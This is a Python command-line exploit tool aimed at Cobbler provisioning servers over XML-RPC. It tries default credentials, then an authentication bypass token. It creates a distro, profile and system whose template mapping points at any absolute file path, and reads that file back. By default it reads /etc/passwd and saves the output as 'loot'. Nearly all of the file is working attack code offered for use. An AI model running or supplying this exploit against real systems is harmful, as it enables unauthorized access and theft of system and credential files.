#!/usr/bin/env python3
"""
Cobbler XML-RPC Exploitation Tool .. (requires semi-ancient cobbler versions) 
Secure version — all output is saved to /tmp/cobbler_loot/ by default
"""
import xmlrpc.client
import re
import sys
import time
import argparse
import os
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import urlparse

SAFE_OUTPUT_DIR = "/tmp/cobbler_loot"

class CobblerExploit:
    """Secure Cobbler XML-RPC exploitation class"""

    def __init__(self, target: str, username: str = "cobbler", password: str = "cobbler"):
        self.target = self._sanitize_target(target)
        self.username = username
        self.password = password
        self.server = self._create_server()
        self.token: Optional[str] = None
        self.auth_method: Optional[str] = None

    def _sanitize_target(self, target: str) -> str:
        if not target:
            raise ValueError("Target cannot be empty")
        if "://" not in target:
            target = f"http://{target}/RPC2"
        elif not target.endswith("/RPC2"):
            target = target.rstrip("/") + "/RPC2"
        parsed = urlparse(target)
        if not parsed.hostname:
            raise ValueError("Invalid hostname in target")
        return target

    def _create_server(self) -> xmlrpc.client.ServerProxy:
        return xmlrpc.client.ServerProxy(self.target, allow_none=True)

    def authenticate(self, quiet: bool = False) -> bool:
        try:
            self.token = self.server.login(self.username, self.password)
            self.auth_method = "credentials"
            if not quiet:
                print(f"[+] Authenticated with credentials: {self.username}")
            return True
        except Exception:
            pass
        try:
            self.token = self.server.login("", -1)
            self.auth_method = "bypass"
            if not quiet:
                print("[+] Authenticated with bypass token")
            return True
        except Exception:
            return False

    def discover_info(self, quiet: bool = False) -> Dict[str, Any]:
        info = {'version': None, 'methods': [], 'distros': [], 'kernel_candidates': []}
        try:
            info['version'] = self.server.version()
        except Exception:
            pass
        try:
            distros = self.server.get_distros(self.token)
            info['distros'] = distros
            for distro in distros:
                if isinstance(distro, dict):
                    k = distro.get('kernel')
                    i = distro.get('initrd')
                    if k and i:
                        info['kernel_candidates'].append((k, i))
        except Exception:
            pass
        if not quiet:
            print(f"[+] Server version: {info['version'] or 'Unknown'}")
            print(f"[+] Existing distros: {len(info['distros'])}")
            print(f"[+] Kernel candidates: {len(info['kernel_candidates'])}")
        return info

    def _get_kernel_initrd(self, kernel: Optional[str], initrd: Optional[str], info: Dict) -> Tuple[str, str]:
        if kernel and initrd:
            return kernel, initrd
        if info['kernel_candidates']:
            return info['kernel_candidates'][0]
        return ("/boot/vmlinuz", "/boot/initrd.img")

    def _sanitize_filepath(self, filepath: str) -> str:
        if not filepath.startswith('/'):
            raise ValueError("Only absolute paths allowed")
        if any(x in filepath for x in ['..', '\x00', '\r', '\n']):
            raise ValueError("Dangerous path detected")
        return filepath

    def read_file(self, filepath: str, kernel: Optional[str] = None, initrd: Optional[str] = None, quiet: bool = False) -> Optional[str]:
        if not self.token:
            raise RuntimeError("Not authenticated")
        filepath = self._sanitize_filepath(filepath)
        info = self.discover_info(quiet=True)
        kernel, initrd = self._get_kernel_initrd(kernel, initrd, info)
        try:
            ts = int(time.time())
            suffix = hash(filepath) % 10000
            names = {
                'distro': f"exp_d_{ts}_{suffix}",
                'profile': f"exp_p_{ts}_{suffix}",
                'system': f"exp_s_{ts}_{suffix}",
                'dest': f"/exp_{ts}_{suffix}"
            }
            # Create distro
            did = self.server.new_distro(self.token)
            self.server.modify_distro(did, "name", names['distro'], self.token)
            self.server.modify_distro(did, "breed", "redhat", self.token)
            self.server.modify_distro(did, "arch", "x86_64", self.token)
            self.server.modify_distro(did, "kernel", kernel, self.token)
            self.server.modify_distro(did, "initrd", initrd, self.token)
            self.server.save_distro(did, self.token)
            # Create profile
            pid = self.server.new_profile(self.token)
            self.server.modify_profile(pid, "name", names['profile'], self.token)
            self.server.modify_profile(pid, "distro", names['distro'], self.token)
            self.server.save_profile(pid, self.token)
            # Create system
            sid = self.server.new_system(self.token)
            self.server.modify_system(sid, "name", names['system'], self.token)
            self.server.modify_system(sid, "profile", names['profile'], self.token)
            self.server.modify_system(sid, "template_files", {filepath: names['dest']}, self.token)
            self.server.save_system(sid, self.token)
            try:
                self.server.sync(self.token)
            except Exception:
                pass
            for use_token in [False, True]:
                try:
                    if use_token:
                        data = self.server.get_template_file_for_system(names['system'], names['dest'], self.token)
                    else:
                        data = self.server.get_template_file_for_system(names['system'], names['dest'])
                    if data:
                        if not quiet:
                            print(f"[+] Read {filepath} ({len(data)} bytes)")
                        return data
                except Exception:
                    continue
            return None
        except Exception as e:
            if not quiet:
                print(f"[-] Exploit error: {e}")
            return None

    def read_multiple_files(self, filepaths: List[str], **kwargs) -> Dict[str, str]:
        results = {}
        for fp in filepaths:
            data = self.read_file(fp, quiet=True, **kwargs)
            if data:
                results[fp] = data
        return results

def ensure_safe_output_dir() -> str:
    """Ensure /tmp/cobbler_loot exists and is safe"""
    os.makedirs(SAFE_OUTPUT_DIR, exist_ok=True)
    return SAFE_OUTPUT_DIR

def save_results(results: Dict[str, str], filename: str) -> None:
    """Save results to /tmp/cobbler_loot/filename"""
    safe_dir = ensure_safe_output_dir()
    safe_path = os.path.join(safe_dir, os.path.basename(filename))
    with open(safe_path, 'w', encoding='utf-8') as f:
        for path, content in results.items():
            f.write(f"=== {path} ===\n")
            f.write(content)
            if not content.endswith('\n'):
                f.write('\n')
            f.write(f"=== END {path} ===\n\n")
    print(f"[+] Results saved to {safe_path}")

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Cobbler XML-RPC Exploit Tool (Safe Output)")
    p.add_argument('target', help='Target host:port')
    p.add_argument('--read-file', help='Read single file')
    p.add_argument('--read-files', nargs='+', help='Read multiple files')
    p.add_argument('--enum-only', action='store_true', help='Only enumerate')
    p.add_argument('--kernel', help='Specify kernel path')
    p.add_argument('--initrd', help='Specify initrd path')
    p.add_argument('-u', '--username', default='cobbler')
    p.add_argument('-p', '--password', default='cobbler')
    p.add_argument('-o', '--output', help='Output filename (saved in /tmp/cobbler_loot/)')
    p.add_argument('-q', '--quiet', action='store_true')
    return p.parse_args()

def main() -> int:
    args = parse_args()
    exp = CobblerExploit(args.target, args.username, args.password)
    if not exp.authenticate(args.quiet):
        print("[-] Authentication failed")
        return 1
    info = exp.discover_info(args.quiet)
    if args.enum_only:
        return 0
    results = {}
    if args.read_file:
        data = exp.read_file(args.read_file, args.kernel, args.initrd, args.quiet)
        if data:
            results[args.read_file] = data
    elif args.read_files:
        results = exp.read_multiple_files(args.read_files, kernel=args.kernel, initrd=args.initrd)
    else:
        data = exp.read_file("/etc/passwd", args.kernel, args.initrd, args.quiet)
        if data:
            results["/etc/passwd"] = data
    if results:
        if args.output:
            save_results(results, args.output)
        elif not args.quiet:
            for fp, content in results.items():
                print(f"\n=== {fp} ===\n{content}\n=== END {fp} ===")
    return 0

if __name__ == "__main__":
    sys.exit(main())
